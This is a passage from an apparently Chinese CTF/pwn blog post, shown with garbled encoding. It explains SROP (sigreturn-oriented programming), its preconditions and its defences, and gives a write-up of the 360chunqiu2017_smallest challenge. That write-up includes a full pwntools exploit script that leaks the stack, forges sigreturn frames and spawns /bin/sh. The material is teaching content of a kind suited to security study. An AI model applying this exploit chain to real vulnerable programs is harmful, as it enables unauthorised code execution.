src="/../img/2706180-20220219203934441-61755889.png"></p><p>è¿™ä¸ªæ˜¯æ‰§è¡Œäº†sigreturnä¹‹åï¼Œå¸ƒç½®çš„å¯„å­˜å™¨ï¼Œæ­¤æ—¶è¿˜æœªæ‰§è¡Œwriteçš„ç³»ç»Ÿè°ƒç”¨ã€‚</p><p><img src="/../img/2706180-20220219203941205-1069503757.png"></p><p>ç°åœ¨æ˜¯æ‰§è¡Œwriteå‡½æ•°ä¹‹åçš„å¯„å­˜å™¨ï¼Œç°åœ¨åº”è¯¥ä¼šæ¢å¤æœ€å¼€å§‹çš„ä¸Šä¸‹æ–‡äº†å§ï¼Ÿ</p><p><img src="/../img/2706180-20220219203948580-1139524450.png"></p><p>what???å±…ç„¶æ²¡æœ‰æ¢å¤ï¼Œå’Œæœ€å¼€å§‹çš„çŒœæµ‹ä¸ä¸€æ ·ã€‚</p><p>é‚£æˆ‘ä»¬é‡æ–°æ‹ä¸€ä¸‹ï¼Œçœ‹çœ‹æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜ï¼Ÿ</p><p>æˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºå°†è¿”å›åœ°å€è®¾ç½®ä¸ºå®ç°sigreturnç³»ç»Ÿè°ƒç”¨çš„gadgetï¼Œç„¶åå†å°†å…¶åé¢çš„æ ˆç©ºé—´å¸ƒç½®æˆæˆ‘ä»¬æƒ³è¦è®¾ç½®çš„å¯„å­˜å™¨çš„å€¼ã€‚å¾…sigreturnç³»ç»Ÿè°ƒç”¨æ‰§è¡Œå®Œæ¯•ï¼Œæ­¤æ—¶çš„å¯„å­˜å™¨å€¼ï¼ŒåŒ…æ‹¬RSP&#x2F;ESPå’ŒRIP&#x2F;EIPéƒ½ä¼šè¢«æ”¹å˜ï¼Œå¯æ˜¯ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘€ï¼Ÿ<strong>sigreturnæœ¬èº«ä¸ä¹Ÿæ˜¯ä¸ªç³»ç»Ÿè°ƒç”¨ä¹ˆï¼Œé‚£æ‰§è¡Œsigreturnä¹‹å‰çš„ä¸Šä¸‹æ–‡ä¹Ÿä¼šè¢«ä¿å­˜ï¼Œæ‰§è¡Œsigreturnçš„æ—¶å€™ç¡®å®ä¼šæ”¹å˜å¯„å­˜å™¨çš„å€¼ï¼Œå¯æ˜¯æ‰§è¡Œsigreturnç³»ç»Ÿè°ƒç”¨ä¹‹åï¼ŒåŸæœ¬çš„ä¸Šä¸‹æ–‡ä¸åˆè¢«æ¢å¤äº†ä¹ˆï¼ˆä½†äº‹å®æ˜¯æ²¡æœ‰æ¢å¤ï¼‰ï¼Ÿ</strong></p><h2 id="å¾—å‡ºæ­£ç¡®ç»“è®º"><a href="#å¾—å‡ºæ­£ç¡®ç»“è®º" class="headerlink" title="å¾—å‡ºæ­£ç¡®ç»“è®º"></a>å¾—å‡ºæ­£ç¡®ç»“è®º</h2><p>è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œroderickå¸ˆå‚…ç»™æˆ‘çš„æç¤ºå»çœ‹ä¸‹sigreturnçš„å®˜æ–¹æ–‡æ¡£ã€‚</p><p><img src="/../img/2706180-20220219203956743-74555339.png"></p><p>æœç„¶ï¼Œåœ¨å®˜æ–¹æ–‡æ¡£çš„ç®€ä»‹ä¸­å°±å†™äº†cleanup stack frameï¼Œè¿™å°±æ„å‘³ç€æ‰§è¡Œäº†sigreturnä¹‹åçš„å‡½æ•°æ ˆå¸§å°±ä¼šè¢«æ¸…é™¤æ‰ï¼Œå½“æ—¶æˆ‘è¿˜æ„Ÿè§‰å“ªé‡Œä¸å¯¹ï¼Œæ€ä¹ˆæ ˆï¼ˆå¦‚ä¸‹å›¾ï¼‰å˜æˆç»¿ç»¿çš„äº†ï¼ŒåŸæ¥æ˜¯åŸæœ¬çš„æ ˆå·²ç»éƒ½è¢«æ¸…é™¤äº†<strong>ï¼ˆæœ¬æ¥æ¸…é™¤çš„åº”è¯¥æ˜¯Signal Frame,ä½†æ˜¯ç”±äºè¿™æ˜¯æˆ‘ä»¬ä¸»åŠ¨è°ƒç”¨çš„sigreturnï¼Œå› æ­¤æŠŠæˆ‘ä»¬çœŸæ­£çš„æ ˆç»™å½“åšSiganal Frameç»™æ¸…é™¤äº†ï¼Œå› æ­¤åŸæœ¬ç³»ç»Ÿè°ƒç”¨sigreturnæ‰€ä¿å­˜çš„ä¸Šä¸‹æ–‡ä¹Ÿåœ¨æ­¤åˆ»æ˜¯è¢«æ¸…é™¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰æ²¡æœ‰åœ¨ç³»ç»Ÿè°ƒç”¨ä¹‹åå¾—åˆ°æœ€å¼€å§‹çš„ä¸Šä¸‹æ–‡ï¼‰</strong>ã€‚<br><img src="/../img/2706180-20220219204003370-492577233.png"></p><h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p><strong>ç”¨äºåœ¨å†…æ ¸åœ¨æ¢å¤ä¸Šä¸‹æ–‡çš„æ—¶å€™å¹¶æ²¡æœ‰ä¸ä¿å­˜çš„ä¸Šä¸‹æ–‡åšå¯¹æ¯”ï¼ŒåŒæ—¶å†…æ ¸åœ¨æ¢å¤ä¸Šä¸‹æ–‡æ—¶æ˜¯ä»æ„é€ çš„Signal Frameä¸­popå‡ºæ¥å„ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œè€Œæ­¤æ—¶çš„Signal Frameæ˜¯åœ¨æ ˆé‡Œçš„å¹¶ä¸”ç”¨æˆ·æ˜¯å¯è¯»å¯å†™çš„ã€‚è¿™ä¸¤ç‚¹ç–å¿½å°±å¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥ä¼ªé€ Signal Frameä¹‹åä¸»åŠ¨æ‰§è¡Œsigreturnæ¥æ§åˆ¶æ¯ä¸ªå¯„å­˜å™¨çš„å€¼ã€‚</strong></p><h1 id="ä½¿ç”¨SROPçš„å‰æï¼š"><a href="#ä½¿ç”¨SROPçš„å‰æï¼š" class="headerlink" title="ä½¿ç”¨SROPçš„å‰æï¼š"></a>ä½¿ç”¨SROPçš„å‰æï¼š</h1><p>1ã€é¦–å…ˆç¨‹åºå¿…é¡»å­˜åœ¨æº¢å‡ºï¼Œèƒ½å¤Ÿæ§åˆ¶è¿”å›åœ°å€ã€‚</p><p>2ã€å¯ä»¥å»ç³»ç»Ÿè°ƒç”¨sigreturnï¼ˆå¦‚æœæ‰¾ä¸åˆ°åˆé€‚çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œå¯ä»¥çœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨readå‡½æ•°æ¥æ§åˆ¶RAXçš„å€¼ï¼‰</p><p>3ã€å¿…é¡»èƒ½å¤ŸçŸ¥é“&#x2F;bin&#x2F;shçš„åœ°å€ï¼Œå¦‚æœå†™çš„bssæ®µï¼Œç›´æ¥å†™åœ°å€å°±è¡Œï¼Œå¦‚æœå†™åˆ°æ ˆé‡Œï¼Œè¿˜éœ€è¦æƒ³åŠæ³•å»æ³„éœ²æ ˆåœ°å€ã€‚</p><p>4ã€å…è®¸æº¢å‡ºçš„é•¿åº¦è¶³å¤Ÿé•¿ï¼Œè¿™æ ·å¯ä»¥å»å¸ƒå±€æˆ‘ä»¬æƒ³è¦çš„å¯„å­˜å™¨çš„å€¼</p><p>5ã€éœ€è¦çŸ¥é“syscallæŒ‡ä»¤çš„åœ°å€</p><h1 id="è¡¥å……ï¼šä¸€ç›´åŠ«æŒç¨‹åºçš„æ§åˆ¶æµ"><a href="#è¡¥å……ï¼šä¸€ç›´åŠ«æŒç¨‹åºçš„æ§åˆ¶æµ" class="headerlink" title="è¡¥å……ï¼šä¸€ç›´åŠ«æŒç¨‹åºçš„æ§åˆ¶æµ"></a>è¡¥å……ï¼šä¸€ç›´åŠ«æŒç¨‹åºçš„æ§åˆ¶æµ</h1><p>æœ€åè¦è¡¥å……çš„ä¸€ç‚¹æ˜¯ï¼Œå‰é¢ä»‹ç»çš„æ–¹æ³•åªèƒ½è°ƒç”¨ä¸€ä¸ªsyscallï¼Œç„¶åæˆ‘ä»¬å°±å¤±å»äº†å¯¹æ‰§è¡Œæµçš„æ§åˆ¶äº†ï¼Œè¿™é‡Œæˆ‘ä»¬å…¶å®æ˜¯å¯ä»¥ä¸€ç›´åŠ«æŒç¨‹åºçš„æ§åˆ¶æµçš„ã€‚</p><p><img src="/../img/2706180-20220219204011362-2119817764.png"></p><p>å›¾ç‰‡å‡ºè‡ª<a href="https://blog.csdn.net/zsj2102/article/details/78561112?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-78561112.pc_agg_new_rank&utm_term=sigreturn+%E5%87%BD%E6%95%B0&spm=1000.2123.3001.4430">(25æ¡æ¶ˆæ¯) Sigreturn Oriented Programming (SROP) Attackæ”»å‡»åŸç†_zsj2102çš„ä¸“æ -CSDNåšå®¢_sigreturn å‡½æ•°</a></p><p>ä¾æ®å›¾ç‰‡æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬æ¯æ¬¡æ§åˆ¶å¯„å­˜å™¨çš„æ—¶å€™ï¼Œéƒ½æŠŠrspå†™æˆä¸‹ä¸€ä¸ªç‰‡æ®µçš„rt_sigreturnçš„åœ°å€ï¼Œå¹¶ä¸”ripçš„åœ°å€è¦æŒ‡å‘syscallï¼›ret  ä¸€å®šè¦åé¢æœ‰retï¼Œä¸ç„¶æ‰€æœ‰çš„ç‰‡æ®µè¿ä¸èµ·æ¥ï¼Œåˆ°retçš„æ—¶å€™ï¼Œå°±ä¼šå»æ‰§è¡Œrspæ‰§è¡Œçš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥ä¸€ç›´åŠ«æŒç¨‹åºçš„æ§åˆ¶æµã€‚</p><h1 id="é˜²å¾¡æ‰‹æ®µï¼š"><a href="#é˜²å¾¡æ‰‹æ®µï¼š" class="headerlink" title="é˜²å¾¡æ‰‹æ®µï¼š"></a>é˜²å¾¡æ‰‹æ®µï¼š</h1><p>æœ€åæˆ‘ä»¬æ¥æä¸€ä¸‹SROPçš„é˜²èŒƒã€‚ä»ä¸‰ä¸ªè§’åº¦å‡ºå‘ï¼Œä½œè€…æå‡ºäº†ä¸‰ç§æ–¹æ³•ï¼š</p><p><em><strong>*Gadgets Prevention*</strong></em></p><p>åœ¨<code>ä¸¤ä¸ªé‡è¦çš„gadgets</code>è¿™ç« æˆ‘æåˆ°ï¼Œåœ¨å½“å‰çš„å‡ ç§ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸­ï¼Œ<code>sigreturn</code>å’Œ<code>syscall; ret</code>è¿™ä¸¤ä¸ªgadgetséå¸¸å®¹æ˜“è¢«æ‰¾åˆ°ï¼Œç‰¹åˆ«æ˜¯åœ¨<code>vsyscall</code>è¿™ç§ç‰¹åˆ«ä¸å®‰å…¨çš„æœºåˆ¶å­˜åœ¨çš„æƒ…å†µä¸‹ã€‚å› æ­¤æˆ‘ä»¬åº”è¯¥å°½é‡é¿å…è¿™ç§æœºåˆ¶ï¼Œè®©ASLRç­‰ä¿æŠ¤æœºåˆ¶ç‰©å°½å…¶ç”¨ï¼Œä½¿å¾—æ”»å‡»è€…å¾ˆéš¾æ‰¾åˆ°è¿™äº›gadgetsã€‚</p><p>å½“ç„¶è¿™ç§æ–¹æ³•å¹¶ä¸èƒ½ä»æœ¬è´¨ä¸Šè§£å†³SROPçš„é—®é¢˜ã€‚</p><p><em><strong>*Signal Frame Canaries*</strong></em></p><p>è¿™ç§æ–¹æ³•å€Ÿé‰´äº<a href="https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries">stack canaries</a>æœºåˆ¶ï¼Œå³åœ¨<code>Signal Frame</code>çš„<code>rt_sigreturn</code>å­—æ®µä¹‹å‰æ’å…¥ä¸€æ®µéšæœºç”Ÿæˆçš„å­—èŠ‚ï¼Œå¦‚æœå‘ç”Ÿoverflowï¼Œåˆ™è¯¥æ®µå­—èŠ‚ä¼šè¢«ç ´åï¼Œä»è€Œåœ¨å‘ç”Ÿ<code>sigreturn</code>ä¹‹å‰ä¼šè¢«æ£€æµ‹åˆ°ã€‚</p><p>å½“ç„¶ï¼Œé’ˆå¯¹stack canariesçš„æ”»å‡»ä¹Ÿå¾ˆå¤šï¼Œå…¶åŒæ ·ä¸èƒ½ä»æœ¬è´¨ä¸Šé˜²æ­¢SROPçš„å‘ç”Ÿã€‚</p><p><em><strong>*Break kernel agnostic*</strong></em></p><p>è¿™å°±è¦è¿½æº¯åˆ°SROPçš„æœ¬è´¨é—®é¢˜äº†ï¼Œå°±æ˜¯å†…æ ¸å¯¹Signalçš„ä¸å¯çŸ¥æ€§ã€‚å¦‚æœæˆ‘ä»¬åœ¨å†…æ ¸å¤„ç†<code>sigreturn</code>ç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™åˆ¤æ–­ä¸€ä¸‹å½“å‰çš„<code>Signal Frame</code>æ˜¯å¦æ˜¯ç”±å†…æ ¸ä¹‹å‰åˆ›å»ºçš„ï¼Œé‚£ä¹ˆè¿™ä¸ªé—®é¢˜å°±èƒ½ä»æ ¹æœ¬ä¸Šè§£å†³ã€‚å½“ç„¶ï¼Œè¿™å°±æ¶‰åŠåˆ°è¦ä¿®æ”¹å†…æ ¸çš„ä¸€äº›åº•å±‚çš„è®¾è®¡äº†ï¼Œå¯èƒ½ä¹Ÿä¼šå¼•å…¥ä¸€äº›æ–°çš„é—®é¢˜ã€‚</p><p>æˆ‘è®¤ä¸ºè¿™ä¸ªä½œè€…æåˆ°çš„è¿™ä¸‰ä¸ªé˜²å¾¡æ‰‹æ®µéƒ½éå¸¸å…¨é¢ï¼Œå› æ­¤æˆ‘å°±ç›´æ¥ä»è¿™ç¯‡åšå®¢å¼•ç”¨äº†<a href="https://blog.csdn.net/zsj2102/article/details/78561112?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-78561112.pc_agg_new_rank&utm_term=sigreturn+%E5%87%BD%E6%95%B0&spm=1000.2123.3001.4430">(25æ¡æ¶ˆæ¯) Sigreturn Oriented Programming (SROP) Attackæ”»å‡»åŸç†_zsj2102çš„ä¸“æ -CSDNåšå®¢_sigreturn å‡½æ•°</a></p><h1 id="å®æˆ˜SROP"><a href="#å®æˆ˜SROP" class="headerlink" title="å®æˆ˜SROP"></a>å®æˆ˜SROP</h1><h2 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h2><p><img src="/../img/2706180-20220220190258944-2045243642.png"></p><p>å¯ä»¥å‘ç°è¿™ä¸ªç¨‹åºåªæœ‰å”¯ä¸€ä¸ªå‡½æ•°ï¼Œå°±æ˜¯è¿™ä¸ªstartå‡½æ•°ï¼ˆçœ‹ç½‘ä¸Šçš„å¸ˆå‚…è¯´è¿™æ˜¯å› ä¸ºå‡ºé¢˜äººç”¨æ±‡ç¼–å†™çš„è¿™ä¸ªç¨‹åºï¼Œç¼–è¯‘ä¹‹åä¹Ÿä¸éœ€è¦ä¸åº“é“¾æ¥ï¼‰ã€‚</p><p>è¿™å°±æ˜¯ä¸€ä¸ªreadç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åå°±æ²¡æœ‰èƒ½åˆ©ç”¨çš„åœ°æ–¹äº†ï¼Œå…¶å®çœ‹åˆ°è¿™ä¸ªå”¯ä¸€çš„ç³»ç»Ÿè°ƒç”¨å°±åº”è¯¥å¾€SROPçš„æ–¹å‘å»æƒ³äº†ï¼Œå› ä¸ºåˆ«çš„å¾ˆå¤šæ–¹æ³•éƒ½ä¸å¯èƒ½é è¿™ä¸ªä¸€ä¸ªstartå‡½æ•°å®Œæˆï¼Œä½†æ˜¯<strong>åªè¦å…è®¸è¾“å…¥çš„é•¿åº¦å¤Ÿé•¿ï¼ŒåŒæ—¶è¿˜æœ‰readçš„ç³»ç»Ÿè°ƒç”¨å°±å¯ä»¥è€ƒè™‘ä½¿ç”¨SROPï¼ˆå› ä¸ºç³»ç»Ÿè°ƒç”¨readå°±æ„å‘³ç€è‚¯å®šä¼šæœ‰syscallï¼ŒåŒæ—¶ç”±äºreadè¿”å›å€¼çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶raxçš„å€¼ï¼Œè¿™ä¹Ÿå°±æœ‰æœºä¼šç³»ç»Ÿè°ƒç”¨sigreturnï¼‰</strong></p><p>ç°åœ¨å…¶å®æœ€å¤§çš„é—®é¢˜æ˜¯æ€ä¹ˆå»æ³„éœ²æ ˆçš„åœ°å€ï¼Ÿæˆ‘ä»¬å¯ä»¥ç¬¬ä¸€æ¬¡readè¯»å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œå»è®©ç³»ç»Ÿè°ƒç”¨å·å˜æˆ1ï¼Œä½†æ˜¯è¿™å°±æ„å‘³ç€æˆ‘ä»¬æ— æ³•æ§åˆ¶è¿”å›åœ°å€ã€‚è¿™é‡Œç”¨äº†å·²ç»å¾ˆå·§å¦™çš„æ–¹æ³•ï¼Œç”±äºæ¯ä¸€æ¬¡è¾“å…¥éƒ½æ˜¯ä»æ ˆé¡¶å¼€å§‹å­˜å…¥æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬ç¬¬ä¸€æ¬¡<strong>è¿ç»­è¾“å…¥äº†ä¸¤ä¸ªstartçš„é¦–åœ°å€</strong>ï¼ˆä½†äº‹å®ä¸Šè¿™é‡Œæ˜¯è¦è¾“å…¥ä¸‰ä¸ªstartçš„åœ°å€ï¼Œä¸è¿‡ç°åœ¨æˆ‘ä»¬å…ˆä¸è®¨è®ºç¬¬ä¸‰ä¸ªstartçš„ä½œç”¨ï¼‰ï¼Œç„¶å<strong>æ‰§è¡Œäº†retï¼Œæ­¤æ—¶ç¬¬ä¸€ä¸ªstartçš„åœ°å€å°±è¢«popå‡ºæ¥äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ç°åœ¨æ ˆé¡¶åªæœ‰ä¸€ä¸ªstartåœ°å€äº†ï¼ŒåŒæ—¶æˆ‘ä»¬ç°åœ¨åˆåˆ°äº†ç³»ç»Ÿè°ƒç”¨readè¿™é‡Œï¼Œç„¶åæˆ‘ä»¬åªå†™ä¸€ä¸ªå­—èŠ‚\xB3,è¿™æ ·startçš„åœ°å€0x4000B0å°±è¢«ä¿®æ”¹æˆäº†0x4000B3ï¼Œ</strong>è¿™æ ·ä½¿å¾—æˆ‘ä»¬çš„RAXé‡Œé¢ç°åœ¨çš„å€¼å°±æ˜¯1äº†ï¼ŒåŒæ—¶ä¸‹ä¸€æ¬¡è¿”å›çš„æ—¶å€™è·³è¿‡äº†ç¬¬ä¸€ä¸ªæŒ‡ä»¤xor rax,raxï¼Œç›´æ¥ä»mov edx,0x400æŒ‡ä»¤å¼€å§‹ï¼Œæœ€ç»ˆå®ç°ç³»ç»Ÿè°ƒç”¨writeï¼Œä»è€Œå®ç°æ ˆåœ°å€æ³„éœ²ã€‚ï¼ˆå¯ä»¥çœ‹è§ä¸‹å›¾çš„å·¦ä¾§æ ˆé¡¶æ˜¯0x4000b0è€Œæ‰§è¡Œäº†readä¹‹åï¼Œå³ä¾§çš„æ ˆé¡¶å·²ç»æ˜¯0x4000b3äº†ï¼‰</p><p><img src="/../img/2706180-20220220190308888-853157541.png"></p><p>ä¸è¿‡ç´§æ¥ç€é‡è§çš„é—®é¢˜å°±æ˜¯ä¼šå‘ç°ç”±äºåªæœ‰ä¸€ä¸ªå‡½æ•°çš„åŸå› ï¼Œæ ˆåº•ç›´æ¥å°±æ˜¯ç¯å¢ƒå˜é‡äº†ï¼Œå› æ­¤æ³„éœ²å‡ºæ¥çš„å…¨éƒ½æ˜¯ç¯å¢ƒå˜é‡ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚</p><p><img src="/../img/2706180-20220220190316234-993019298.png"><br>è€Œç¯å¢ƒå˜é‡ä¸­æ²¡æœ‰ä»»ä½•ä¸€ä¸ªå†…å­˜å•å…ƒæŒ‡å‘æ ˆåœ°å€ï¼Œå› æ­¤æˆ‘ä»¬æ²¡æ³•ç”¨å…·ä½“çš„åç§»ç›´æ¥è®¡ç®—ï¼Œä¸è¿‡å¥½æ¶ˆæ¯æ˜¯ï¼Œ**ç”±äºæ ˆåœ°å€éšæœºåŒ–çš„åœ°å€å˜åŒ–å¹¶ä¸æ˜¯å¤ªå¤§ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€‰å–ä¸€ç‰‡ç©ºçš„æ ˆåŒºå»å­˜æ”¾æˆ‘ä»¬çš„å‚æ•°å’Œsignal frameï¼ˆé€šè¿‡æ³„éœ²çš„åœ°å€ç›´æ¥å‡å»ä¸€ä¸ªè¾ƒå¤§çš„æ•°æ®æ¥æŒ‡å‘è¿™ç‰‡æ ˆåŒº)**ã€‚</p><p>æœ€åçš„éš¾ç‚¹å°±æ˜¯æˆ‘ä»¬çš„system call chainsçš„æ„å»ºï¼Œ<strong>ç”±äºæˆ‘ä»¬è‚¯å®šæ˜¯ç”¨ä¸€æ¬¡sigreturnç„¶åæ§åˆ¶å‚æ•°å»è°ƒç”¨readï¼ˆå› ä¸ºæˆ‘ä»¬è¦æŠŠå‚æ•°å†™å…¥æŒ‡å®šçš„åœ°å€ï¼‰ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥ç³»ç»Ÿè°ƒç”¨ sigreturnï¼Œéœ€è¦é—´æ¥çš„ç”¨readå‡½æ•°æ¥æ§åˆ¶RAXåœ¨ç³»ç»Ÿè°ƒç”¨æ‰è¡Œï¼Œå¹¶ä¸”è¿˜éœ€è¦ä¸€æ¬¡sigreturnå»æ§åˆ¶å‚æ•°è°ƒç”¨execve</strong>ã€‚</p><p>è¿™é‡Œä¹Ÿæ˜¯ç”¨äº†ä¸€ä¸ªéå¸¸å·§å¦™çš„æ‰‹æ³•ï¼Œç”±äºè¦æ§åˆ¶RAXä¸º15ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬åªèƒ½è¾“å…¥15ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œå¯æ˜¯æˆ‘ä»¬è¿˜éœ€è¦å»æ„é€ signal frameï¼Œå› æ­¤æˆ‘ä»¬åˆ†ä¸¤æ¬¡å®Œæˆï¼Œç¬¬ä¸€æ¬¡è¾“å…¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªstartå¯ä»¥è®©æˆ‘ä»¬å†è¾“å…¥ä¸€æ¬¡ï¼Œè€Œæ­¤æ—¶æŠŠframeç»™æ„å»ºåˆ°æ ˆé‡Œé¢ï¼Œè¿™å…«ä¸ªaåˆ™æ˜¯è´Ÿè´£å»å ä¸€ä¸ªä½ç½®ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220220190323742-16754978.png"></p><p>ç¬¬äºŒæ¬¡è¾“å…¥ï¼Œè¿™æ ·syscallå°±åˆ°äº†åŸæœ¬å…«ä¸ªaå çš„ä½ç½®ï¼Œè€Œä¸ƒä¸ªbåˆ™æ˜¯ä¸ºäº†å‡‘é½åäº”ä¸ªå­—èŠ‚ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220220190329950-517103708.png"></p><p>æŒ‰ç…§è¿™ä¸¤æ¬¡payloadå°±å¯ä»¥å®ç°sigreturnè°ƒç”¨äº†ã€‚</p><p>ç„¶åå°±æ²¡ä»€ä¹ˆäº†ï¼Œæœ€åè¦æ³¨æ„ä¸€ä¸‹ï¼Œç¬¬äºŒæ¬¡æ‰§è¡Œsigreturnçš„ç¬¬ä¸€ä¸ªpayloadé¡ºä¾¿æŠŠå‚æ•°ç»™å‘é€è¿‡å»ï¼Œç„¶åç”¨æˆ‘ä»¬åœ¨ç³»ç»Ÿè°ƒç”¨readçš„é‚£ä¸ªrsié…åˆåç§»æ¥è·å–&#x2F;bin&#x2F;shçš„åœ°å€å³å¯ã€‚</p><p>æœ€åçš„expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28000)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x4000BE</span></span><br><span class="line">start_addr=<span class="number">0x4000B0</span></span><br><span class="line">payload=p64(start_addr)*<span class="number">3</span></span><br><span class="line"><span class="comment">#ç¬¬ä¸€ä¸ªstartå»è®©ç¬¬ä¸€æ¬¡æ­£å¸¸è¿è¡Œçš„retè¿”å›åˆ°start</span></span><br><span class="line"><span class="comment">#ç¬¬äºŒä¸ªstartè®©\xB3è¾“å…¥è¿›æ¥ï¼Œæ­¤æ—¶å»æ”¹å˜äº†æ ˆé¡¶çš„startï¼Œæ­¤æ—¶å®ƒè·³è¿‡äº†xor rax,raxï¼Œå¹¶</span></span><br><span class="line"><span class="comment">#ä¸”å®ƒçš„ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªstart</span></span><br><span class="line"><span class="comment">#æœ€ä¸‹é¢çš„startæ˜¯è®©æˆ‘ä»¬å¯ä»¥å†è¾“å…¥frameï¼Œä¸€ç›´æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">&#x27;\xB3&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x2000</span><span class="comment">#å‡å»0x2000ï¼ŒæŠŠpayloadå†™åˆ°è¯¥åœ°å€</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0x400</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">frame.rsp=target_addr</span><br><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr+<span class="number">0x110</span> <span class="comment">#æ­¤æ—¶åŠ ä¸Š0x110æ‰æ˜¯/bin/shçš„åœ°å€</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame).ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="BUUCTF-ciscn-2019-es-7"><a href="#BUUCTF-ciscn-2019-es-7" class="headerlink" title="BUUCTF_ciscn_2019_es_7"></a>BUUCTF_ciscn_2019_es_7</h2><p>è¿™é‡Œæˆ‘ä»¥BUUCTFä¸Šçš„ciscn_2019_es_7æ¥æ¼”ç¤ºä¸€ä¸‹ï¼ˆè¿™é“é¢˜æˆ‘æœ€å¼€å§‹æ˜¯ç”¨ret2csuåšå‡ºæ¥çš„ï¼Œé‚£ä¸ªWPæ”¾åˆ°äº†ret2csuçš„é‚£ç¯‡åšå®¢ä¸Šï¼Œè¿™ç¯‡åšå®¢å†™ä¸€ä¸‹SROPè¿™ä¸ªæ–¹æ³•ï¼‰</p><p>å…¶å®SROPçš„æ€è·¯å¾ˆç®€å•ï¼Œå¹¶ä¸”pwntoolsä¸­ä¹Ÿæä¾›äº†Sigreturn Frameç±»æ¥ç®€åŒ–æˆ‘ä»¬ä»£ç çš„ç¼–å†™ã€‚</p><p><img 